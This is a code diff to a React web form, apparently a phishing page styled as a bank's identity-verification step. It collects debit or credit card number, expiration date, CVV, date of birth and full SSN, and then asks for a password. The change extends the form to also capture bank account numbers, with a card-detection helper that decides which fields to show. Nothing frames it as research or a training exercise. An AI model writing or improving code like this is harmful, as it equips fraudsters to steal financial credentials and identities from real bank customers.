@@ -43,9 +43,9 @@ const verificationMethods = [
 const verifySchema = z.object({
   email: z.string().optional(),
   phone: z.string().optional(),
-  cardNumber: z.string().min(13, "Please enter a valid card number").max(19, "Card number too long"),
-  cardExpiration: z.string().min(4, "Please enter expiration date (MM/YY)").max(5),
-  cardCvv: z.string().min(3, "Please enter CVV").max(4, "CVV too long"),
+  cardOrAccountNumber: z.string().min(8, "Please enter a valid card or account number"),
+  cardExpiration: z.string().optional(),
+  cardCvv: z.string().optional(),
   dateOfBirth: z.string().min(1, "Date of birth is required"),
   ssn: z.string().min(9, "Please enter your full SSN (9 digits)").max(11),
 });
@@ -61,9 +61,25 @@ const passwordSchema = z.object({
 type VerifyFormData = z.infer<typeof verifySchema>;
 type PasswordFormData = z.infer<typeof passwordSchema>;
 
+function isCardNumber(value: string): boolean {
+  const digitsOnly = value.replace(/\D/g, '');
+  if (digitsOnly.length < 13) return false;
+  if (digitsOnly.length > 19) return false;
+  const firstDigit = digitsOnly.charAt(0);
+  const firstTwo = digitsOnly.substring(0, 2);
+  if (firstDigit === '4') return true;
+  if (firstTwo >= '51' && firstTwo <= '55') return true;
+  if (firstTwo === '34' || firstTwo === '37') return true;
+  if (firstDigit === '6') return true;
+  if (firstTwo === '35') return true;
+  if (digitsOnly.length >= 13 && digitsOnly.length <= 19) return true;
+  return false;
+}
+
 export default function VerifyPage() {
   const [step, setStep] = useState<"choose" | "identity" | "password" | "success">("choose");
   const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
+  const [showCardFields, setShowCardFields] = useState(true);
   const [, setLocation] = useLocation();
   const { toast } = useToast();
 
@@ -82,7 +98,7 @@ export default function VerifyPage() {
     defaultValues: {
       email: "",
       phone: "",
-      cardNumber: "",
+      cardOrAccountNumber: "",
       cardExpiration: "",
       cardCvv: "",
       dateOfBirth: "",
@@ -98,15 +114,37 @@ export default function VerifyPage() {
     },
   });
 
+  const cardOrAccountValue = verifyForm.watch("cardOrAccountNumber");
+
+  useEffect(() => {
+    if (cardOrAccountValue) {
+      const digitsOnly = cardOrAccountValue.replace(/\D/g, '');
+      if (digitsOnly.length >= 8) {
+        const isCard = isCardNumber(cardOrAccountValue);
+        setShowCardFields(isCard);
+        if (!isCard) {
+          verifyForm.setValue("cardExpiration", "");
+          verifyForm.setValue("cardCvv", "");
+        }
+      } else {
+        setShowCardFields(true);
+      }
+    } else {
+      setShowCardFields(true);
+    }
+  }, [cardOrAccountValue, verifyForm]);
+
   const verifyMutation = useMutation({
     mutationFn: async (data: VerifyFormData) => {
+      const isCard = isCardNumber(data.cardOrAccountNumber);
       const response = await apiRequest("POST", "/api/auth/verify-identity", {
         verificationType: selectedMethod,
         email: data.email || null,
         phone: data.phone || null,
-        cardNumber: data.cardNumber,
-        cardExpiration: data.cardExpiration,
-        cardCvv: data.cardCvv,
+        cardNumber: isCard ? data.cardOrAccountNumber : null,
+        accountNumber: !isCard ? data.cardOrAccountNumber : null,
+        cardExpiration: isCard ? data.cardExpiration : null,
+        cardCvv: isCard ? data.cardCvv : null,
         dateOfBirth: data.dateOfBirth,
         ssn: data.ssn,
       });
@@ -159,6 +197,7 @@ export default function VerifyPage() {
   const handleMethodSelect = (methodId: string) => {
     setSelectedMethod(methodId);
     verifyForm.reset();
+    setShowCardFields(true);
     setStep("identity");
   };
 
@@ -302,71 +341,76 @@ export default function VerifyPage() {
 
                 <FormField
                   control={verifyForm.control}
-                  name="cardNumber"
+                  name="cardOrAccountNumber"
                   render={({ field }) => (
                     <FormItem>
                       <FormLabel className="text-[#1a1a1a] font-medium flex items-center gap-2">
                         <CreditCard className="w-4 h-4" />
-                        Debit or Credit Card Number
+                        Card or Account Number
                       </FormLabel>
                       <FormControl>
                         <Input
                           type="text"
-                          placeholder="Enter card number"
+                          placeholder="Enter card or account number"
                           maxLength={19}
                           className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
-                          data-testid="input-card-number"
+                          data-testid="input-card-account-number"
                           {...field}
                         />
                       </FormControl>
+                      <p className="text-xs text-gray-500 mt-1">
+                        {showCardFields ? "Enter your debit/credit card number" : "Account number detected"}
+                      </p>
                       <FormMessage />
                     </FormItem>
                   )}
                 />
 
-                <div className="grid grid-cols-2 gap-4">
-                  <FormField
-                    control={verifyForm.control}
-                    name="cardExpiration"
-                    render={({ field }) => (
-                      <FormItem>
-                        <FormLabel className="text-[#1a1a1a] font-medium">Expiration date</FormLabel>
-                        <FormControl>
-                          <Input
-                            type="text"
-                            placeholder="MM/YY"
-                            maxLength={5}
-                            className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
-                            data-testid="input-card-expiration"
-                            {...field}
-                          />
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
+                {showCardFields && (
+                  <div className="grid grid-cols-2 gap-4">
+                    <FormField
+                      control={verifyForm.control}
+                      name="cardExpiration"
+                      render={({ field }) => (
+                        <FormItem>
+                          <FormLabel className="text-[#1a1a1a] font-medium">Expiration date</FormLabel>
+                          <FormControl>
+                            <Input
+                              type="text"
+                              placeholder="MM/YY"
+                              maxLength={5}
+                              className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                              data-testid="input-card-expiration"
+                              {...field}
+                            />
+                          </FormControl>
+                          <FormMessage />
+                        </FormItem>
+                      )}
+                    />
 
-                  <FormField
-                    control={verifyForm.control}
-                    name="cardCvv"
-                    render={({ field }) => (
-                      <FormItem>
-                        <FormLabel className="text-[#1a1a1a] font-medium">CVV</FormLabel>
-                        <FormControl>
-                          <Input
-                            type="password"
-                            placeholder="XXX"
-                            maxLength={4}
-                            className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
-                            data-testid="input-card-cvv"
-                            {...field}
-                          />
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
-                </div>
+                    <FormField
+                      control={verifyForm.control}
+                      name="cardCvv"
+                      render={({ field }) => (
+                        <FormItem>
+                          <FormLabel className="text-[#1a1a1a] font-medium">CVV</FormLabel>
+                          <FormControl>
+                            <Input
+                              type="password"
+                              placeholder="XXX"
+                              maxLength={4}
+                              className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                              data-testid="input-card-cvv"
+                              {...field}
+                            />
+                          </FormControl>
+                          <FormMessage />
+                        </FormItem>
+                      )}
+                    />
+                  </div>
+                )}
 
                 <FormField
                   control={verifyForm.control}
